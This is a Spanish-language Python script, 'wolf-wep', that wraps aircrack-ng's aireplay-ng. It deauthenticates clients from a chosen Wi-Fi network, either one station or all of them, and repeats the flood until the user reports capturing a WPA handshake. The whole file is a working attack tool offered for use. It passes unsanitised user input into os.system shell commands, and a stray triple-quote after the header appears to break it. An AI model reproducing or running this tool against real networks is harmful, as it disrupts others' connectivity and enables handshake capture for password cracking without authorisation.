#! /usr/bin/python3
# _Programa : wolf-wep_
# _Version :1.0_
# _Creador : Gabriel Romero_
# _Contacto : gabrielromero0499@gmail.com_
# _Apodo : Wolf-Saiko_

#################################################################
#                                                               #
# -*- ENCODING: UTF-8 -*-                                       #
# Este script es software libre. Puede redistribuirlo y/o       #
# modificar-lo bajo los términos de la Licencia Pública General #
# de GNU según es publicada por la Free Software Foundation,    #
# bien de la versión 3 de dicha Licencia o bien (según su       #
# elección) de cualquier versión posterior.                     #
#                                                               #
# Si usted hace alguna modificación en esta aplicación,         #
# deberá siempre mencionar al autor original de la misma.       #
#                                                               #
# Autor: Script creado por Wolf-Saiko                           #
#                                                               #
# Integra Funciones De:                                         #
#                                                               #
# Python 3                                                      #
# Aircrack-ng                                                   #
# Xterm                                                         #
#                                                               #
# Un saludo                                                     # 
#                                                               #
#################################################################""")

import os
import click
import time

os.system ("sudo clear")

def menu():

	os.system ('sudo clear')

	print (""" 
__    __   ___   __     ____  __    __ __  ____ __    ___ ____   ___    ___ __ __
 ||    ||  // \\  ||    ||     ||    || || ||    ||   //   || \\ // \\  //   || //
 \\ /\ // ((   )) ||    ||==   \\ /\ // || ||==  ||  ((    ||_// ||=|| ((    ||<< 
  \V/\V/   \\_//  ||__| ||      \V/\V/  || ||    ||   \\__ || \\ || ||  \\__ || \\
                                                                                   
                            Desautenticador De Clientes""")

	print ("""
$#################################$
#               MENU              #  
#                                 #
# 1) ataque espesifico            #
#                                 #
# 2) Atacar a todos               #
#                                 #
# 3) Ya tengo el Handshake        #
#                                 #
$#################################$""")




os.system ("clear")

print ("""
=--------------------------=
|Desconectando los clientes|
=--------------------------=""")

print ("""\n
=**********************************=
* Ingrese el mac del wifi objetivo *
=**********************************=""")
bssid = input ("\n>> ")

print ("""\n
=*************************************=
* Ingrese el nombre del wifi objetivo *
=*************************************=""")
essid = input ("\n>> ")

print ("""\n
=*****************************************=
* Ingrese su targeta wifi en modo Monitor *
=*****************************************=""")
targetaM = input ("\n>> ")

while True:

	menu()

	opc = click.getchar()
	os.system ('clear')

	if opc == "1":

		print ("""\n
=*********************************************************=
* Ingrese el mac de un usuario conectado al wifi objetivo *
=*********************************************************=""")

		station = input ("\n>> ")

		comando1 = ("sudo aireplay-ng -0 10 -a '%s' -c '%s' %s" % (bssid, station, targetaM))

		os.system (comando1)
		os.system ('clear')

		print ("logro capturar el HANDSHAKE ?")

		print ("""\n
$############$
#            #
# 1 ) Yes    #
#            #
# 2 ) No     #
#            #
# 3 ) Menu   #
#            #
$############$\n""")

		opc1 = click.getchar()

		while True:

			if opc1 == "1":
				quit()

			elif opc1 == "2":

				print ("*** reintentando ***")
				os.system ('clear')
				os.system (comando1)
				os.system ("clear")
				print ("*** Por favor espere ***")
				time.sleep (2)
				os.system ('clear')
				print ("logro capturar el HANDSHAKE ?\n")
				
				print ("""\n
$############$
#            #
# 1 ) Yes    #
#            #
# 2 ) No     #
#            #
# 3 ) Menu   #
#            #
$############$\n""")

				opc1 = click.getchar()

			elif opc1 == "3":
				break

			else:
				print ("*** Esa opcion no existe ***")
				os.system ('clear')

	elif opc == "2":

		comando2 = ("sudo aireplay-ng -0 10 -a %s -e %s %s" % (bssid, essid, targetaM))

		os.system (comando2)
		time.sleep (1)
		os.system ('clear')

	elif opc == "3":

		os.system ("clear")
		quit()

	else:

		print ("*** Esa opcion no existe ***")
		time.sleep (2)